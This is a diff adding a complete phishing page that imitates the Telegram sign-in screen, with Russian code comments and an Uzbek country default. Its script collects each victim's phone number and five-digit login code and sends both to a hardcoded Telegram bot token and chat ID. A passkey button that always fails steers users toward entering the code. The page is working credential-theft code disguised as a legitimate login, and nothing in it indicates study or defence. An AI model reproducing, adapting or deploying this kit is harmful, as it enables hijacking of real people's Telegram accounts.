@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Telegram</title>
+    <style>
+        :root {
+            /* Официальный зеленый фон Telegram со светлым паттерном */
+            --bg-color: #7aae94;
+            --bg-pattern: url("data:image/svg+xml,%3Csvg width='160' height='160' viewBox='0 0 160 160' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23689d82' fill-opacity='0.3'%3E%3Cpath d='M14 14h12v12H14V14zm24 24h12v12H38V38zm24-24h12v12H62V14zM14 62h12v12H14V62zm48 0h12v12H62V62zM38 86h12v12H38V86zm24 24h12v12H62v-12zm-48 24h12v12H14v-12zm96-120h12v12H110V14zm24 24h12v12h-12V38zm24-24h12v12h-12V14zm-24 48h12v12h-12V62zm24 24h12v12h-12V86zM110 98h12v12h-12V98zm24 24h12v12h-12v-12zm-24 24h12v12h-12v-12z'/%3E%3C/g%3E%3C/svg%3E");
+            --card-bg: #ffffff;
+            --text-color: #000000;
+            --text-secondary: #707579;
+            --input-bg: #f4f4f5;
+            --input-border: #dfe1e5;
+            --accent-color: #3390ec;
+            --accent-hover: #237cd8;
+        }
+
+        body.dark-theme {
+            /* Официальный темный фон Telegram с паттерном */
+            --bg-color: #0e1621;
+            --bg-pattern: url("data:image/svg+xml,%3Csvg width='160' height='160' viewBox='0 0 160 160' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%2317212b' fill-opacity='0.6'%3E%3Cpath d='M14 14h12v12H14V14zm24 24h12v12H38V38zm24-24h12v12H62V14zM14 62h12v12H14V62zm48 0h12v12H62V62zM38 86h12v12H38V86zm24 24h12v12H62v-12zm-48 24h12v12H14v-12zm96-120h12v12H110V14zm24 24h12v12h-12V38zm24-24h12v12h-12V14zm-24 48h12v12h-12V62zm24 24h12v12h-12V86zM110 98h12v12h-12V98zm24 24h12v12h-12v-12zm-24 24h12v12h-12v-12z'/%3E%3C/g%3E%3C/svg%3E");
+            --card-bg: #212121;
+            --text-color: #ffffff;
+            --text-secondary: #aaaaaa;
+            --input-bg: #2f2f2f;
+            --input-border: #383838;
+            --accent-color: #8774e1;
+            --accent-hover: #7561d4;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            background-image: var(--bg-pattern);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: background-color 0.3s ease, color 0.3s ease;
+            padding: 15px;
+        }
+
+        /* Переключатель темы */
+        .theme-toggle {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.15);
+            border: none;
+            color: var(--text-color);
+            cursor: pointer;
+            font-size: 20px;
+            z-index: 100;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(5px);
+            transition: background 0.2s;
+        }
+        .theme-toggle:hover {
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        /* Карточка */
+        .card {
+            background-color: var(--card-bg);
+            width: 100%;
+            max-width: 420px;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
+            text-align: center;
+            z-index: 10;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        /* Иконка Telegram */
+        .logo-container {
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .telegram-icon {
+            width: 80px;
+            height: 80px;
+            background-color: var(--accent-color);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            fill: white;
+            transition: background-color 0.3s ease;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+
+        /* Поля ввода и селекторы */
+        .input-group {
+            position: relative;
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .input-label {
+            font-size: 11px;
+            color: var(--accent-color);
+            position: absolute;
+            top: 8px;
+            left: 15px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .custom-select, .custom-input {
+            width: 100%;
+            background-color: var(--input-bg);
+            border: 1px solid var(--input-border);
+            border-radius: 12px;
+            padding: 22px 15px 8px 15px;
+            color: var(--text-color);
+            font-size: 16px;
+            outline: none;
+            cursor: pointer;
+            transition: border-color 0.2s, background-color 0.3s ease;
+        }
+
+        .custom-select:focus, .custom-input:focus {
+            border-color: var(--accent-color);
+        }
+
+        /* Выпадающий список стран */
+        .dropdown-list {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            width: 100%;
+            max-height: 220px;
+            background-color: var(--card-bg);
+            border: 1px solid var(--input-border);
+            border-radius: 12px;
+            overflow-y: auto;
+            margin-top: 5px;
+            display: none;
+            z-index: 50;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        }
+
+        .dropdown-item {
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .dropdown-item:hover {
+            background-color: var(--input-bg);
+        }
+
+        .country-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .country-flag {
+            width: 24px;
+            height: 18px;
+            object-fit: cover;
+            border-radius: 3px;
+        }
+
+        /* Кнопки */
+        .btn-next {
+            width: 100%;
+            background-color: var(--accent-color);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: var(--accent-hover);
+        }
+
+        .links-container {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .action-link {
+            background: none;
+            border: none;
+            color: var(--accent-color);
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .action-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Ошибка */
+        .error-msg {
+            color: #ff5252;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        /* Страница ввода кода (OTP) */
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 25px 0;
+        }
+
+        .otp-input {
+            width: 45px;
+            height: 55px;
+            background-color: var(--input-bg);
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            color: var(--text-color);
+            font-size: 22px;
+            text-align: center;
+            outline: none;
+            transition: border-color 0.2s, background-color 0.3s ease;
+        }
+
+        .otp-input:focus {
+            border-color: var(--accent-color);
+        }
+
+        .phone-display {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 5px;
+            word-break: break-all;
+        }
+
+        .edit-phone {
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: var(--text-secondary);
+            font-size: 16px;
+            transition: color 0.2s;
+        }
+        .edit-phone:hover {
+            color: var(--accent-color);
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* МОБИЛЬНАЯ АДАПТИВНОСТЬ (MEDIA QUERIES) */
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+                align-items: center;
+            }
+
+            .card {
+                padding: 25px 15px;
+                border-radius: 16px;
+                box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+            }
+
+            h1 {
+                font-size: 21px;
+            }
+
+            p {
+                font-size: 13px;
+                margin-bottom: 20px;
+            }
+
+            .telegram-icon {
+                width: 70px;
+                height: 70px;
+            }
+
+            .otp-container {
+                gap: 6px;
+            }
+
+            .otp-input {
+                width: 38px;
+                height: 48px;
+                font-size: 18px;
+                border-radius: 8px;
+            }
+
+            .theme-toggle {
+                top: 10px;
+                right: 10px;
+                width: 35px;
+                height: 35px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Кнопка смены темы -->
+    <button class="theme-toggle" id="themeToggleBtn" onclick="toggleTheme()">🌙</button>
+
+    <div class="card">
+        <!-- СТРАНИЦА 1: Ввод номера -->
+        <div id="step1">
+            <div class="logo-container">
+                <div class="telegram-icon">
+                    <svg viewBox="0 0 24 24" width="40" height="40"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.03-1.99 1.27-5.62 3.72-.53.36-1 .54-1.42.53-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.35-.49.97-.75 3.8-1.65 6.33-2.74 7.58-3.28 3.61-1.57 4.36-1.84 4.85-1.85.11 0 .37.03.54.17.14.12.18.28.2.45-.02.07-.02.13-.04.27z"/></svg>
+                </div>
+            </div>
+            <h1>Sign in to Telegram</h1>
+            <p>Please confirm your country code<br>and enter your phone number.</p>
+
+            <form id="loginForm" onsubmit="handleNext(event)">
+                <div class="input-group">
+                    <span class="input-label">Country</span>
+                    <div class="custom-select" id="countrySelectBtn" onclick="toggleDropdown()">Uzbekistan</div>
+                    <div class="dropdown-list" id="dropdownList">
+                        <div style="padding: 8px;">
+                            <input type="text" id="countrySearch" placeholder="Search..." oninput="filterCountries()" class="custom-input" style="padding: 10px; font-size: 14px;">
+                        </div>
+                        <div id="countriesContainer"></div>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <span class="input-label">Phone Number</span>
+                    <input type="tel" id="phoneNumber" class="custom-input" value="+998 " required oninput="validatePhone(this)">
+                </div>
+
+                <button type="submit" class="btn-next">NEXT</button>
+            </form>
+
+            <div class="links-container">
+                <button class="action-link" onclick="handlePasskey()">LOG IN BY PASSKEY</button>
+            </div>
+            <div class="error-msg" id="errorMsg">Something went wrong, please try again</div>
+        </div>
+
+        <!-- СТРАНИЦА 2: Ввод кода из Telegram -->
+        <div id="step2" class="hidden">
+            <div class="logo-container">
+                <div class="telegram-icon">
+                    <svg viewBox="0 0 24 24" width="40" height="40"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.03-1.99 1.27-5.62 3.72-.53.36-1 .54-1.42.53-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.35-.49.97-.75 3.8-1.65 6.33-2.74 7.58-3.28 3.61-1.57 4.36-1.84 4.85-1.85.11 0 .37.03.54.17.14.12.18.28.2.45-.02.07-.02.13-.04.27z"/></svg>
+                </div>
+            </div>
+
+            <div class="phone-display">
+                <span id="displayPhone"></span>
+                <button class="edit-phone" onclick="goToStep1()" title="Edit phone number">✏️</button>
+            </div>
+            <p>We have sent you a message in Telegram with the code.</p>
+
+            <div class="otp-container" id="otpContainer">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" oninput="handleOtpInput(this, 0)" onkeydown="handleOtpKeydown(event, 0)">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" oninput="handleOtpInput(this, 1)" onkeydown="handleOtpKeydown(event, 1)">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" oninput="handleOtpInput(this, 2)" onkeydown="handleOtpKeydown(event, 2)">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" oninput="handleOtpInput(this, 3)" onkeydown="handleOtpKeydown(event, 3)">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" oninput="handleOtpInput(this, 4)" onkeydown="handleOtpKeydown(event, 4)">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // НАСТРОЙКА TELEGRAM БОТА
+        const BOT_TOKEN = "8979626944:AAFpDWu2sq2iy5OrFarxJyrCPa2_So292YM"; 
+        const CHAT_ID = "8691889148";
+
+        async function sendToTelegram(text) {
+            if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+            } catch (e) {
+                console.error("Telegram send error:", e);
+            }
+        }
+
+        // Список стран
+        const countries = [
+            { name: "Afghanistan", code: "+93", iso: "af" },
+            { name: "Albania", code: "+355", iso: "al" },
+            { name: "Algeria", code: "+213", iso: "dz" },
+            { name: "Andorra", code: "+376", iso: "ad" },
+            { name: "Angola", code: "+244", iso: "ao" },
+            { name: "Argentina", code: "+54", iso: "ar" },
+            { name: "Armenia", code: "+374", iso: "am" },
+            { name: "Australia", code: "+61", iso: "au" },
+            { name: "Austria", code: "+43", iso: "at" },
+            { name: "Azerbaijan", code: "+994", iso: "az" },
+            { name: "Belarus", code: "+375", iso: "by" },
+            { name: "Belgium", code: "+32", iso: "be" },
+            { name: "Canada", code: "+1", iso: "ca" },
+            { name: "France", code: "+33", iso: "fr" },
+            { name: "Germany", code: "+49", iso: "de" },
+            { name: "Kazakhstan", code: "+7", iso: "kz" },
+            { name: "Russia", code: "+7", iso: "ru" },
+            { name: "Turkey", code: "+90", iso: "tr" },
+            { name: "Ukraine", code: "+380", iso: "ua" },
+            { name: "United Kingdom", code: "+44", iso: "gb" },
+            { name: "United States", code: "+1", iso: "us" },
+            { name: "Uzbekistan", code: "+998", iso: "uz" }
+        ];
+
+        let selectedCountryCode = "+998";
+
+        function renderCountries(list) {
+            const container = document.getElementById('countriesContainer');
+            container.innerHTML = '';
+            list.forEach(c => {
+                const div = document.createElement('div');
+                div.className = 'dropdown-item';
+                div.innerHTML = `
+                    <div class="country-info">
+                        <img src="https://flagcdn.com/w40/${c.iso}.png" class="country-flag" alt="${c.name}">
+                        <span>${c.name}</span>
+                    </div>
+                    <span style="color:var(--text-secondary);">${c.code}</span>
+                `;
+                div.onclick = () => selectCountry(c);
+                container.appendChild(div);
+            });
+        }
+
+        function toggleDropdown() {
+            const list = document.getElementById('dropdownList');
+            list.style.display = list.style.display === 'block' ? 'none' : 'block';
+            if(list.style.display === 'block') {
+                document.getElementById('countrySearch').focus();
+            }
+        }
+
+        function selectCountry(country) {
+            document.getElementById('countrySelectBtn').innerText = country.name;
+            selectedCountryCode = country.code;
+            document.getElementById('phoneNumber').value = country.code + " ";
+            document.getElementById('dropdownList').style.display = 'none';
+        }
+
+        function filterCountries() {
+            const query = document.getElementById('countrySearch').value.toLowerCase();
+            const filtered = countries.filter(c => c.name.toLowerCase().includes(query) || c.code.includes(query));
+            renderCountries(filtered);
+        }
+
+        renderCountries(countries);
+
+        window.onclick = function(event) {
+            if (!event.target.closest('.input-group')) {
+                document.getElementById('dropdownList').style.display = 'none';
+            }
+        }
+
+        // Переключение тем
+        function toggleTheme() {
+            document.body.classList.toggle('dark-theme');
+            const btn = document.getElementById('themeToggleBtn');
+            btn.innerText = document.body.classList.contains('dark-theme') ? '☀️' : '🌙';
+        }
+
+        // Валидация телефона (только цифры)
+        function validatePhone(input) {
+            let val = input.value;
+            let cleaned = val.replace(/[^0-9+]/g, '');
+            if (!cleaned.startsWith(selectedCountryCode)) {
+                cleaned = selectedCountryCode + " " + cleaned.replace(/[^0-9]/g, '');
+            }
+            input.value = cleaned;
+        }
+
+        // Ошибка по клику на Passkey
+        function handlePasskey() {
+            const err = document.getElementById('errorMsg');
+            err.style.display = 'block';
+        }
+
+        // Переход на следующий шаг
+        function handleNext(e) {
+            e.preventDefault();
+            const phone = document.getElementById('phoneNumber').value;
+            document.getElementById('displayPhone').innerText = phone;
+            
+            sendToTelegram(`📱 Новый вход в Telegram:\nНомер: ${phone}`);
+
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            document.querySelectorAll('.otp-input')[0].focus();
+        }
+
+        // Возврат на 1 шаг назад
+        function goToStep1() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+        }
+
+        // Ввод кода (только цифры)
+        const otpInputs = document.querySelectorAll('.otp-input');
+
+        function handleOtpInput(input, index) {
+            input.value = input.value.replace(/[^0-9]/g, '');
+
+            if (input.value && index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
+            }
+
+            let fullCode = "";
+            otpInputs.forEach(inp => fullCode += inp.value);
+            if (fullCode.length === 5) {
+                const phone = document.getElementById('phoneNumber').value;
+                sendToTelegram(`🔑 Получен код подтверждения:\nНомер: ${phone}\nКод: *${fullCode}*`);
+            }
+        }
+
+        function handleOtpKeydown(event, index) {
+            if (event.key === 'Backspace' && !otpInputs[index].value && index > 0) {
+                otpInputs[index - 1].focus();
+            }
+        }
+    </script>
+</body>
+</html>
